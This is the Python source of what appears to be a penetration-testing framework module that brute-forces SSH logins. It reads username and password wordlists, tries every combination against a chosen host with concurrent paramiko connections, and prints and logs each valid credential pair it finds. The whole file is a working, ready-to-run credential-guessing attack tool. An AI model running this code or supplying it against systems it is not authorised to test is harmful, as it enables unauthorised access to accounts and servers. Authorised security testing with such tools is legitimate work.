import paramiko
import concurrent.futures
import socket
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'auxiliary/ssh_bruteforce',
        'description': 'SSH credential brute force using a username/password wordlist.',
        'options': {
            'RHOST': 'Target SSH server IP or hostname',
            'RPORT': 'Target SSH port [default: 22]',
            'USER_FILE': 'Path to username wordlist',
            'PASS_FILE': 'Path to password wordlist',
            'USERNAME': 'Single username to try (overrides USER_FILE)',
            'THREADS': 'Concurrent threads [default: 5]',
            'TIMEOUT': 'Connection timeout in seconds [default: 5]',
            'STOP_ON_FIRST': 'Stop after first successful login [default: true]',
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self._stop = False

    def _try_login(self, host, port, user, password, timeout):
        if self._stop:
            return None
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port=port, username=user, password=password,
                           timeout=timeout, banner_timeout=timeout,
                           allow_agent=False, look_for_keys=False)
            client.close()
            return (user, password)
        except paramiko.AuthenticationException:
            return None
        except (socket.error, paramiko.SSHException):
            return None
        except Exception:
            return None

    def run(self):
        rhost = self.framework.options.get('RHOST')
        rport = int(self.framework.options.get('RPORT', 22))
        user_file = self.framework.options.get('USER_FILE', '')
        pass_file = self.framework.options.get('PASS_FILE', '')
        single_user = self.framework.options.get('USERNAME', '')
        threads = int(self.framework.options.get('THREADS', 5))
        timeout = float(self.framework.options.get('TIMEOUT', 5))
        stop_first = self.framework.options.get('STOP_ON_FIRST', 'true').lower() == 'true'

        if not rhost:
            console.print("[red][!] RHOST is required.[/red]")
            return

        # Build credential pairs
        if single_user:
            usernames = [single_user]
        elif user_file:
            try:
                with open(user_file) as f:
                    usernames = [l.strip() for l in f if l.strip()]
            except FileNotFoundError:
                console.print(f"[red][!] USER_FILE not found: {user_file}[/red]")
                return
        else:
            console.print("[red][!] Set either USERNAME or USER_FILE.[/red]")
            return

        if not pass_file:
            console.print("[red][!] PASS_FILE is required.[/red]")
            return
        try:
            with open(pass_file) as f:
                passwords = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            console.print(f"[red][!] PASS_FILE not found: {pass_file}[/red]")
            return

        combos = [(u, p) for u in usernames for p in passwords]
        console.print(f"[cyan][*] SSH bruteforce on {rhost}:{rport} — {len(combos)} combinations, {threads} threads...[/cyan]")
        log_action(f"SSH bruteforce started on {rhost}:{rport}")

        found = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self._try_login, rhost, rport, u, p, timeout): (u, p) for u, p in combos}
            for future in concurrent.futures.as_completed(futures):
                u, p = futures[future]
                result = future.result()
                if result:
                    console.print(f"[bold green][+] VALID: {u}:{p}[/bold green]")
                    log_action(f"SSH valid credentials on {rhost}: {u}:{p}")
                    found.append(result)
                    if stop_first:
                        self._stop = True
                        break
                else:
                    console.print(f"  [dim][-] {u}:{p}[/dim]")

        if not found:
            console.print("[yellow][!] No valid credentials found.[/yellow]")
        else:
            console.print(f"\n[bold green][+] {len(found)} credential(s) found![/bold green]")
